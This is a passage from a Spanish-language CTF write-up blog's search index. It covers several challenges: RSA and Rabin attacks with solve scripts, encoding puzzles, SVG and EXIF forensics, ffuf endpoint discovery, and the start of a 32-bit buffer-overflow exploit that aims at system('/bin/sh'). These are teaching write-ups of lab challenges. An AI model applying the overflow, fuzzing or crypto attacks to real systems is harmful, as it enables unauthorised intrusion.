(m_1^2 + m_1 C) \\cdot 256^K \\pmod{n_1} \\\\ \u0026amp;\\equiv 2 m_1 P + m_1 C - m_1 C \\cdot 256^K \\pmod{n_1} \\\\ \u0026amp;\\equiv m_1 \\cdot (2 P + C - C \\cdot 256^K) \\pmod{n_1} \\end{split} \\end{equation} $$\nEn este punto, podemos despejar $m_1$:\n$$ m_1 = (X - c_1 \\cdot 256^K) \\cdot (2 P + C - C \\cdot 256^K)^{-1} \\pmod{n_1} $$\nY ya tenemos todo listo, ahora solo tenemos que programarlo. Este es un script en Python que soluciona el reto:\n#!/usr/bin/env python3 import math def main(): with open('out.txt') as f: n1, c1, c2, n2, c3, c4, L = map(int, f.read().splitlines()) C = math.gcd(n1 - 4, n2 - 4) // 3 K = 256 - math.floor(L / 2) P = int(hex(K)[2:] * K, 16) X = (c2 - P ** 2 - P * C) * pow(256 ** K, -1, n1) % n1 m1 = (X - 256 ** K * c1) * pow(2 * P + C - C * 256 ** K, -1, n1) % n1 K = 256 - math.ceil(L / 2) P = int(hex(K)[2:] * K, 16) Y = (c4 - P ** 2 - P * C) * pow(256 ** K, -1, n2) % n2 m2 = (Y - 256 ** K * c3) * pow(2 * P + C - C * 256 ** K, -1, n2) % n2 print(bytes.fromhex(hex(m1)[2:] + hex(m2)[2:])) if __name__ == '__main__': main()  $ python3 solve.py b'HTB{You_were_supposed_to_find_the_gcd_trick_then_search_and_find_the_ACSC_writeup_learn_some_interesting_stuff_and_solve_the_challege_but_I_forgot_about_the_most_basic_thing_I_m_sorry:(}'  El script completo se puede encontrar aquí: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/crypto/down-the-rabinhole/","section":"ctf","summary":"Máximo Común Divisor. Aritmética modular. Relleno PKCS7","time":5,"title":"Down the Rabinhole"},{"contents":"Tenemos la siguiente página web:\nParece que tenemos que calcular el hash MD5 de la cadena de texto mostrada y enviarla:\n$ echo -n Vzf9GeB5zAFDZ2M3oKSa | md5sum c03463878fee34e249962c4aef9af84c -  Pero hemos sido muy lentos\u0026hellip;\nPor tanto, tendremos que programar un script que envíe la petición lo más rápido posible. Una cosa importante a tener en cuenta es mantener la cookie PHPSESSID configurada por el servidor:\n$ curl -I 134.209.187.167:31212/ HTTP/1.1 200 OK Date: Server: Apache/2.4.18 (Ubuntu) Set-Cookie: PHPSESSID=474q2v5pq3sfhgtt9gcf7c5j40; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Content-Type: text/html; charset=UTF-8  Una vez que tenemos un script válido que extrae la cadena de texto, calcula el hash MD5 y envía la petición POST, obtenemos la flag:\n$ python3 solve.py 134.209.187.167:31212 HTB{N1c3_ScrIpt1nG_B0i!} $ bash solve.sh 134.209.187.167:31212 HTB{N1c3_ScrIpt1nG_B0i!}  Los scripts se pueden encontrar aquí: solve.py y solve.sh.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/misc/emdee-five-for-life/","section":"ctf","summary":"MD5. Peticiones web. Scripting","time":0,"title":"Emdee five for life"},{"contents":"Se nos proporciona el siguiente texto:\nThis is NOT going to be fun. TmljZSEgTm93IGtlZXAgZ29pbmcuIDU0Nzc2ZjIwNmQ2ZjcyNjUyZTIwMzEzMDMwMzAzMTMxMzAyMDMxMzEzMDMxMzAzMDMxMjAzMTMxMzAzMTMxMzEzMDIwMzEzMTMwMzAzMDMwMzEyMDMxMzEzMDMxMzEzMDMwMjAzMTMwMzAzMDMwMzAyMDMxMzAzMDMwMzEzMDMwMjAzMTMxMzAzMDMxMzAzMTIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMTMwMzAzMTMwMjAzMTMxMzEzMTMwMzAzMTIwMzEzMTMxMzAzMDMwMzAyMDMxMzEzMTMwMzEzMDMwMjAzMTMxMzAzMTMwMzAzMTIwMzEzMTMwMzEzMTMxMzEyMDMxMzEzMDMxMzEzMTMwMjAzMTMwMzAzMDMwMzEyMDMxMzAzMDMwMzAzMDIwMzEzMDMxMzAzMDMwMzEyMDMxMzEzMDMwMzAzMTIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMxMjAzMTMxMzAzMDMwMzEzMDIwMzEzMDMwMzAzMTMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzAzMTMwMzAzMDIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMDMxMzEzMDMxMjAzMTMxMzAzMTMwMzEyMDMxMzEzMDMxMzEzMTIwMzEzMDMxMzAzMDMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMDMwMzAzMTMwMjAzMTMwMzEzMDMxMzAzMDIwMzEzMDMxMzAzMTMxMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMDMxMjAzMTMxMzAzMTMwMzEzMTIwMzEzMTMxMzAzMDMxMjAzMTMwMzEzMDMxMzEzMDIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMTMwMzAzMDMwMjAzMTMwMzEzMDMwMzEzMDIwMzEzMTMwMzEzMTMwMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzEzMDMxMzAyMDMxMzAzMTMwMzEzMDMwMjAzMTMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzE=  Vemos una cadena de texto larga que está codificada en Base64. Si la decodificamos, tenemos otro texto:\n$ data=TmljZSEgTm93IGtlZXAgZ29pbmcuIDU0Nzc2ZjIwNmQ2ZjcyNjUyZTIwMzEzMDMwMzAzMTMxMzAyMDMxMzEzMDMxMzAzMDMxMjAzMTMxMzAzMTMxMzEzMDIwMzEzMTMwMzAzMDMwMzEyMDMxMzEzMDMxMzEzMDMwMjAzMTMwMzAzMDMwMzAyMDMxMzAzMDMwMzEzMDMwMjAzMTMxMzAzMDMxMzAzMTIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMTMwMzAzMTMwMjAzMTMxMzEzMTMwMzAzMTIwMzEzMTMxMzAzMDMwMzAyMDMxMzEzMTMwMzEzMDMwMjAzMTMxMzAzMTMwMzAzMTIwMzEzMTMwMzEzMTMxMzEyMDMxMzEzMDMxMzEzMTMwMjAzMTMwMzAzMDMwMzEyMDMxMzAzMDMwMzAzMDIwMzEzMDMxMzAzMDMwMzEyMDMxMzEzMDMwMzAzMTIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMxMjAzMTMxMzAzMDMwMzEzMDIwMzEzMDMwMzAzMTMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzAzMTMwMzAzMDIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMDMxMzEzMDMxMjAzMTMxMzAzMTMwMzEyMDMxMzEzMDMxMzEzMTIwMzEzMDMxMzAzMDMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMDMwMzAzMTMwMjAzMTMwMzEzMDMxMzAzMDIwMzEzMDMxMzAzMTMxMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMDMxMjAzMTMxMzAzMTMwMzEzMTIwMzEzMTMxMzAzMDMxMjAzMTMwMzEzMDMxMzEzMDIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMTMwMzAzMDMwMjAzMTMwMzEzMDMwMzEzMDIwMzEzMTMwMzEzMTMwMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzEzMDMxMzAyMDMxMzAzMTMwMzEzMDMwMjAzMTMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzE= $ echo $data | base64 -d Nice! Now keep going. 54776f206d6f72652e2031303030313130203131303130303120313130313131302031313030303031203131303131303020313030303030203130303031303020313130303130312031313030303131203131313030313020313131313030312031313130303030203131313031303020313130313030312031313031313131203131303131313020313030303031203130303030302031303130303031203131303030312031303130303130203130303031313120313130303031302031303030313131203130313031313020313130313030302031313030303131203131303131303120313130313031203131303131312031303130303131203130313031313020313131303031203130303030313020313031303130302031303130313130203131313030312031303130303031203130313031303120313130313031312031313130303120313031303131302031303130303130203130303031313020313131303031203130313030303020313031303031302031313031313030203131313030312031303131303130203130313031303020313130303031203130313031313020313131303031  Esta vez parecen datos en hexadecimal. Vamos a decodificarlo otra vez:\n$ data=54776f206d6f72652e2031303030313130203131303130303120313130313131302031313030303031203131303131303020313030303030203130303031303020313130303130312031313030303131203131313030313020313131313030312031313130303030203131313031303020313130313030312031313031313131203131303131313020313030303031203130303030302031303130303031203131303030312031303130303130203130303031313120313130303031302031303030313131203130313031313020313130313030302031313030303131203131303131303120313130313031203131303131312031303130303131203130313031313020313131303031203130303030313020313031303130302031303130313130203131313030312031303130303031203130313031303120313130313031312031313130303120313031303131302031303130303130203130303031313020313131303031203130313030303020313031303031302031313031313030203131313030312031303131303130203130313031303020313130303031203130313031313020313131303031 $ echo $data | xxd -r -p Two more. 1000110 1101001 1101110 1100001 1101100 100000 1000100 1100101 1100011 1110010 1111001 1110000 1110100 1101001 1101111 1101110 100001 100000 1010001 110001 1010010 1000111 1100010 1000111 1010110 1101000 1100011 1101101 110101 110111 1010011 1010110 111001 1000010 1010100 1010110 111001 1010001 1010101 1101011 111001 1010110 1010010 1000110 111001 1010000 1010010 1101100 111001 1011010 1010100 110001 1010110 111001  Y ahora tenemos información en binario. Lo podemos decodificar con un \u0026ldquo;one-liner\u0026rdquo; en Python:\n$ data='1000110 1101001 1101110 1100001 1101100 100000 1000100 1100101 1100011 1110010 1111001 1110000 1110100 1101001 1101111 1101110 100001 100000 1010001 110001 1010010 1000111 1100010 1000111 1010110 1101000 1100011 1101101 110101 110111 1010011 1010110 111001 1000010 1010100 1010110 111001 1010001 1010101 1101011 111001 1010110 1010010 1000110 111001 1010000 1010010 1101100 111001 1011010 1010100 110001 1010110 111001' $ python3 -c \"print(''.join(map(lambda n: chr(int(n, 2)), '$data'.split())))\" Final Decryption! Q1RGbGVhcm57SV9BTV9QUk9VRF9PRl9ZT1V9  Y obtenemos otra cadena codificada en Base64. Si la decodificamos otra vez, obtenemos la flag:\n$ echo Q1RGbGVhcm57SV9BTV9QUk9VRF9PRl9ZT1V9 | base64 -d CTFlearn{I_AM_PROUD_OF_YOU}  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/ctflearn/cryptography/encryption-master/","section":"ctf","summary":"Decodificación en Base64, hexadecimal y binario","time":1,"title":"Encryption Master"},{"contents":"Tenemos el archivo de una imagen SVG llamada drawing.flag.svg:\nA simple vista, no se ve nada, pero si miramos en el código XML que aparece en el archivo SVG, veremos los caracteres de la flag:\n\u0026lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u0026gt; \u0026lt;!-- Created with Inkscape (http://www.inkscape.org/) --\u0026gt; \u0026lt;svg xmlns:dc=\"http://purl.org/dc/elements/1.1/\" xmlns:cc=\"http://creativecommons.org/ns#\" xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\" xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:sodipodi=\"http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd\" xmlns:inkscape=\"http://www.inkscape.org/namespaces/inkscape\" width=\"210mm\" height=\"297mm\" viewBox=\"0 0 210 297\" version=\"1.1\" id=\"svg8\" inkscape:version=\"0.92.5 (2060ec1f9f, 2020-04-08)\" sodipodi:docname=\"drawing.svg\"\u0026gt; \u0026lt;defs id=\"defs2\" /\u0026gt; \u0026lt;sodipodi:namedview id=\"base\" pagecolor=\"#ffffff\" bordercolor=\"#666666\" borderopacity=\"1.0\" inkscape:pageopacity=\"0.0\" inkscape:pageshadow=\"2\" inkscape:zoom=\"0.69833333\" inkscape:cx=\"400\" inkscape:cy=\"538.41159\" inkscape:document-units=\"mm\" inkscape:current-layer=\"layer1\" showgrid=\"false\" inkscape:window-width=\"1872\" inkscape:window-height=\"1016\" inkscape:window-x=\"48\" inkscape:window-y=\"27\" inkscape:window-maximized=\"1\" /\u0026gt; \u0026lt;metadata id=\"metadata5\"\u0026gt; \u0026lt;rdf:RDF\u0026gt; \u0026lt;cc:Work rdf:about=\"\"\u0026gt; \u0026lt;dc:format\u0026gt;image/svg+xml\u0026lt;/dc:format\u0026gt; \u0026lt;dc:type rdf:resource=\"http://purl.org/dc/dcmitype/StillImage\" /\u0026gt; \u0026lt;dc:title\u0026gt;\u0026lt;/dc:title\u0026gt; \u0026lt;/cc:Work\u0026gt; \u0026lt;/rdf:RDF\u0026gt; \u0026lt;/metadata\u0026gt; \u0026lt;g inkscape:label=\"Layer 1\" inkscape:groupmode=\"layer\" id=\"layer1\"\u0026gt; \u0026lt;ellipse id=\"path3713\" cx=\"106.2122\" cy=\"134.47203\" rx=\"102.05357\" ry=\"99.029755\" style=\"stroke-width:0.26458332\" /\u0026gt; \u0026lt;circle style=\"fill:#ffffff;stroke-width:0.26458332\" id=\"path3717\" cx=\"107.59055\" cy=\"132.30211\" r=\"3.3341289\" /\u0026gt; \u0026lt;ellipse style=\"fill:#000000;stroke-width:0.26458332\" id=\"path3719\" cx=\"107.45217\" cy=\"132.10078\" rx=\"0.027842503\" ry=\"0.031820003\" /\u0026gt; \u0026lt;text xml:space=\"preserve\" style=\"font-style:normal;font-weight:normal;font-size:0.00352781px;line-height:1.25;font-family:sans-serif;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;stroke-width:0.26458332;\" x=\"107.43014\" y=\"132.08501\" id=\"text3723\"\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.08501\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3748\"\u0026gt;p \u0026lt;/tspan\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.08942\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3754\"\u0026gt;i \u0026lt;/tspan\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.09383\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3756\"\u0026gt;c \u0026lt;/tspan\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.09824\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3758\"\u0026gt;o \u0026lt;/tspan\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.10265\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3760\"\u0026gt;C \u0026lt;/tspan\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.10706\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3762\"\u0026gt;T \u0026lt;/tspan\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.11147\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3764\"\u0026gt;F { 3 n h 4 n \u0026lt;/tspan\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.11588\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3752\"\u0026gt;c 3 d _ a a b 7 2 9 d d }\u0026lt;/tspan\u0026gt;\u0026lt;/text\u0026gt; \u0026lt;/g\u0026gt; \u0026lt;/svg\u0026gt;  Si conectamos los puntos, tenemos la flag: picoCTF{3nh4nc3d_aab729dd}.\n","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/picoctf/forensics/enhance/","section":"ctf","summary":"picoCTF 2022. 100 puntos. Imagen SVG","time":0,"title":"Enhance!"},{"contents":"Se nos proporciona el código en Python utilizado para cifrar la flag:\n#!/usr/bin/env python3 fromCrypto.Util.numberimport* m=bytes_to_long(open('flag.txt', 'rb').read()) n=1 foriinrange(5): n*=getPrime(2025) e=31 c=pow(m, e, n) print(f'{n= }') print(f'{c= }')  Y tenemos el texto cifrado $c$ y el módulo $n$ de una implementación RSA. Nótese que $e = 31$ es muy pequeño y que $n$ es muy grande. Por tanto, seremos capaces de hacer la raíz de orden 31 para recuperar el mensaje $m$, ya que\n$$ c = m ^ e \\pmod{n} $$\nComo $n$ es muy grande y $e$ muy pequeño, puede ocurrir que $m ^ e \u0026lt; n$, y entonces el módulo $n$ no tiene efecto, por lo que $m = \\sqrt[e]{c}$. Podemos calcular esta raíz $e$-ésima con gmpy2 en Python:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; n = 291803461471835548029967773522617765771350293869936352202474825278720037203079126582761195517055393337441548702117740296881683037727672928813574338546415946481976583248116652581196557944379208515379849557208903959136881415277929278949854798024237931268890091008477560536810024512885987056365875451976655685041061567307476564581225633751629621363138947815696306121690184995538414167930734015725366640439645369938523746682075126307100603220423134559397115857296708492139355989095937406415073168747479949371092134873701556328545495456400479495405193756279972004658782475408189585025641505819277077925673695334900236713191922331469670007945415879984668758786665610223439789798214375546410680980683442235218021025215976372242754132940477478408728993116985028306733912194477013321051867704500024616342520287838575375839552875084135772432229149413294380432533743143268579060594509980073144254923676380538357838797628476519470503636727538392293326221896054673794948778257952143474326337234955144876478098752630600927746134626196808185237724150959895921700993985671689787276218491977409950443800149225682113795630552332504004952619477399053219103742133837193866168480669953649964494066888017534621349322438584844756384881305359216958596115238052386689420189458226861633978864646432620132110836770754297086384562270853072519298962385476479869301761383621785222318621201306854098202131486922131567300293859330130962769515935517026489631422656886068186229630258223006684833047809688321362843298049850048526302305175457080852712874501906848203834687269452532674672111135077303202528935822816608612547229714776677161298357980007749334544698155455911782984751127779599045510344930085038624054982145201414246233123815597579302583147041169085302625820240543206702814039468429064024961160403696288636475388432798179348622575416616596660498584921414806447533272237263496191108268914962604350759322278134843256344477715665697069507629272092477112527371006313935780156040584212958154549663363234981080730341044630508652240837192014074955790169192194298119435104568924354781734446534914749601480158889645876224737439717511154355206076336705115742763304668954084456504898364386765064143296380474352710379369338692522064891115596552538797109330579251735034330969865851105628851397031731926651793499033360226446821843504185544154328716719785183357806999155047816431736359882490550923048419234555352161279478407242984715707163307294861304711709346203477359865199980901678783907976621786706266847296286119737497401164377524189197707568924565911584058570117345183256470833488981286971331095107229945553900124115789585129411526064683438180406246914918344456337671900934740227313729020212681061906134397379053692184471039837008926116046967034965277671872122518335972888506407864660599133420704405557724318002121940379059800231596103401873109461507047985158261487833687090154196870319427268386336264078936523908731859981832206513441924170577885564684644417486126018121796087385930741681311819019125337235246299198151106436637821460451583430819222542798910970466234016929862844811 \u0026gt;\u0026gt;\u0026gt; c = 226930369324008404506430665129822599607363575603852919162120583266060503841096845215449850837542305149561600338927114119661251460696499327139957176529329816529721270191210916244477856685216908277164786965592514696226839914244875659319076517558315356771625419496558856490589162500644071477833930756663564789474118682399930460441453389184243891216077282099093040608309336018996001999607804378777688916461360425788926205328424150096034051909616660195338367962715944075422262015953517413557051762509103453392458978208273498438562590307215849951642965795004794034627510875473381435541017212698396608282069420063879979294704473018597265098131904018063045638336304539514249356120536639126440406176682131920666202709416873040296025545675588170167188101050321143515763604977360112398853875935854811777919563324598193504991150103686515910286033304218405898596673422366231606745906059933502082246405148016608529329647781881278472976090154368272290761619490459310416194216982004034487788734832367018517887748097898401525507381806366491661667977442619626223736995461937920878273486909559233659993985592623485669719325763874250803422121180632196849036588606681806804779542977650673644965059641304478487892054477356779339273971259597178303031111140283501709064199430436811542668710546345343441829103999774652299936885473523503009793950905394505839067527152330406049376043739899459809162044962915696399547788486686478589032533842260339084289115269117632962020418999678475193626806742925843561762423017088328632995430074096317560695952243685718370993439935920576217955150699936307124819436288798249076737597129112939696691564055039464675485835224015600323880336127740300585706502138276566411354270875449815373574454780958012435380709513462476775660322560648809380299392885568074034592363611854633574329130489038883130308557866650522882369513797748667234932757559604717587488355500387902038121779580165322861111064918787012060293221646897837406810365496082480818926712329359069411884747738664835433270202960934930293501624299923646957173316725913900452048522962309107483401916982942273644258253234270266404355705906353284060421906451579547553536945596143114182089674169040390233403896259650990843716723248382763373947627940237097774346467516704409787940216547116621556170101766022005778473958237584851951344954861454573678221816288918395713861770977183669035942556070546761545743731295074496369509049235313470403093920087296483871093325318582310743131764728865964884228088025170409263061963059341395163695331110078909587683201275928829278515137618074138615962652765840849275249482071226860249873486273492767754112528529082909363770315076153401338000909130399064593162194239842969972233531547178659983688101566357539063657007915493318885261560981584227020995472033268237671253586876466785624983819848898009727296036477735934655396784185145970437264598583023149435320752783415451501056661506420824553646380553999069539369921607338465904854175989857439546309918605715931884872868486467592929171204176835962074595013700782437300593834359405047404582902352876008272897313 \u0026gt;\u0026gt;\u0026gt; import gmpy2 \u0026gt;\u0026gt;\u0026gt; gmpy2.iroot(c, 31) (mpz(200356292991524037137861561536744232032744458778044360811305506965391630908660572435153888208107258), False)  Pero la salida muestra False, lo cual significa que la raíz no es exacta. Entonces, podemos pensar que el módulo sí que tiene efecto, pero tiene que ser pequeño. Y por tanto, $m = \\sqrt[e]{c + k \\cdot n}$, donde $k$ es un número entero.\nPodemos usar un bucle for hasta que encontremos una raíz exacta, y luego mostramos el valor en formato bytes:\n\u0026gt;\u0026gt;\u0026gt; for k in range(n): ... m, ok = gmpy2.iroot(c + k * n, 31) ... if ok: ... print(k, bytes.fromhex(hex(m)[2:]).decode()) ... break ... 28 ictf{d0nt_f0rget_t0_pad_y0ur_pl@intexts!}  Y aquí tenemos la flag, nótese que $k = 28$, por lo que $m = \\sqrt[31]{c + 28 \\cdot n}$, que es la vulnerabilidad de usar un módulo grande y un exponente pequeño en RSA.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/enourmous/","section":"ctf","summary":"ImaginaryCTF 05/08/2022. 50 puntos. RSA. Módulo grande y exponente pequeño","time":1,"title":"Enormous"},{"contents":"Se nos pide encontrar la flag en esta imagen:\nSin embargo, la flag no está visible en la propia imagen ni oculta en su contenido. En cambio, podemos encontrar la flag en los metadatos del archivo.\nPara extraer los metadatos, podemos utilizar exiftool:\n$ exiftool Computer-Password-Security-Hacker\\ -\\ Copy.jpg ExifTool Version Number : 12.30 File Name : Computer-Password-Security-Hacker - Copy.jpg Directory : . File Size : 54 KiB File Modification Date/Time : - File Access Date/Time : - File Inode Change Date/Time : - File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.02 X Resolution : 100 Y Resolution : 100 Exif Byte Order : Big-endian (Motorola, MM) Resolution Unit : None Y Cb Cr Positioning : Centered Exif Version : 0231 Components Configuration : Y, Cb, Cr, - Flashpix Version : 0100 Owner Name : CTFlearn{3l1t3_3x1f_4uth0r1ty_dud3br0} GPS Latitude Ref : South GPS Longitude Ref : East Quality : 60% DCT Encode Version : 100 APP14 Flags 0 : [14], Encoded with Blend=1 downsampling APP14 Flags 1 : (none) Color Transform : YCbCr Image Width : 660 Image Height : 371 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:4:4 (1 1) Image Size : 660x371 Megapixels : 0.245 GPS Latitude : 77 deg 17' 2.62\" S GPS Longitude : 44 deg 4' 7.30\" E GPS Position : 77 deg 17' 2.62\" S, 44 deg 4' 7.30\" E  Y aquí está la flag: CTFlearn{3l1t3_3x1f_4uth0r1ty_dud3br0}.\n","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/ctflearn/forensics/exif/","section":"ctf","summary":"Metadatos de archivos","time":1,"title":"Exif"},{"contents":"Se nos proporciona un servidor puzzler7.imaginaryctf.org:5005. Si enviamos una petición GET usando curl, obtenemos la siguiente respuesta:\n$ curl puzzler7.imaginaryctf.org:5005 {\"api_message\":\"Yet another sourceless web...\"} $ curl -i puzzler7.imaginaryctf.org:5005 HTTP/1.1 200 OK date: server: uvicorn content-length: 47 content-type: application/json {\"api_message\":\"Yet another sourceless web...\"}  Empleando ffuf, descubrimos dos rutas docs y redoc:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://puzzler7.imaginaryctf.org:5005/FUZZ docs [Status: 200, Size: 931, Words: 150, Lines: 31, Duration: 114ms] redoc [Status: 200, Size: 891, Words: 176, Lines: 31, Duration: 111ms] [Status: 200, Size: 47, Words: 4, Lines: 1, Duration: 111ms]  Ambas sirven para mostrar una documentación de API para gente que quiera consumir dicha API:\nAhí podemos encontrar la ruta que tiene la flag:\n$ curl puzzler7.imaginaryctf.org:5005/wow_this_is_such_a_long_and_odd_name_for_a_flag_endpoint_hmmmmm {\"flag\":\"ictf{google_the_protocol_is_different_than_guessy...right?}\"}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/fasting/","section":"ctf","summary":"ImaginaryCTF 28/09/2022. 50 puntos. Documentación de API","time":0,"title":"Fasting"},{"contents":"Se nos proporciona un servidor al que conectarnos por SSH. Existe un binario de 32 bits llamado color que es SGID:\ncolor@ubuntu-512mb-nyc3-01:~$ ls -l total 20 -r--r--r-- 1 root root 714 Sep 12 2017 Makefile -r-xr-sr-x 1 root color_pwn 7672 Sep 12 2017 color -r--r--r-- 1 root root 722 Sep 12 2017 color.c -r--r----- 1 root color_pwn 24 Sep 12 2017 flag.txt color@ubuntu-512mb-nyc3-01:~$ file color color: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e9a1c78d69ac7f50ffbf21b1075902cea8407db3, not stripped color@ubuntu-512mb-nyc3-01:~$ checksec color [*] '/home/color/color' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)  También tenemos el código fuente en C. Básicamente, lo que hace el programa es llamar a la función gets, que es vulnerable a Buffer Overflow. Luego, la variable buf se utiliza dentro de un bucle for, resultando siempre en good = 0, ya que se utilizan operaciones XOR y operaciones AND para obtener un cero en good, de manera que vuln devuelve siempre 0 y system(\u0026quot;/bin/sh\u0026quot;) no se ejecuta:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int vuln() { char buf[32]; printf(\"Enter your favorite color: \"); gets(buf); int good = 0; for (int i = 0; buf[i]; i++) { good \u0026amp;= buf[i] ^ buf[i]; } return good; } int main(char argc, char** argv) { setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); // disable buffering. setbuf(stdout, NULL); if (vuln()) { puts(\"Me too! That's my favorite color too!\"); puts(\"You get a shell! Flag is in flag.txt\"); system(\"/bin/sh\"); } else { puts(\"Boo... I hate that color! :(\"); } }  Sin embargo, podemos explotar el Buffer Overflow para redirigir el programa a system(\u0026quot;/bin/sh\u0026quot;).\nAunque el servidor tiene GDB instalado con la extensión PEDA, decidí depurarlo en local. Para transferir el binario, se puede codificar en Base64, copiar el resultado y decodificarlo en local.\nPrimero, lo ejecutamos e identificamos la vulnerabilidad de Buffer Overflow:\n$ ./color  Enter your favorite color: AAAA Boo... I hate that color! :( $ ./color Enter your favorite color: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA zsh: segmentation fault (core dumped) ./color  Perfecto. Ahora podemos utilizar GDB para obtener el offset necesario para sobrescribir el registro $eip (que contiene la dirección de la siguiente instrucción a ejecutar):\n$ gdb -q color Reading symbols from color... (No debugging symbols found in color) gef➤ pattern create 100 [+] Generating a pattern of 100 bytes (n=4) aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa [+] Saved as '$_gef0' gef➤ run Starting program: ./color Enter your favorite color: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa Program received signal SIGSEGV, Segmentation fault. 0x6161616e in ?? ()  gef➤ pattern offset $eip [+] Searching for '$eip' [+] Found at offset 52 (little-endian search) likely [+] Found at offset 49 (big-endian search)  Vemos que necesitamos 52 bytes antes de $eip. Vamos a probarlo:\ngef➤ pattern create 52 [+] Generating a pattern of 52 bytes (n=4) aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa [+] Saved as '$_gef1' gef➤ run Starting program: ./color Enter your favorite color: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaaBBBB Program received signal SIGSEGV, Segmentation fault. 0x42424242 in ?? ()  Genial, tenemos control sobre $eip. Ahora podemos buscar la dirección a la que queremos saltar, que es system:\n$ gdb -q color Reading symbols from color... (No debugging symbols found in color) gef➤ p system $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0x8048450 \u0026lt;system@plt\u0026gt;  No obstante, necesitamos llamar a system(\u0026quot;/bin/sh\u0026quot;), por lo que tenemos que obtener un puntero a la cadena \u0026quot;/bin/sh\u0026quot;. Esto se puede realizar con strings:\n$ strings -atx color | grep /bin/sh 799 /bin/sh 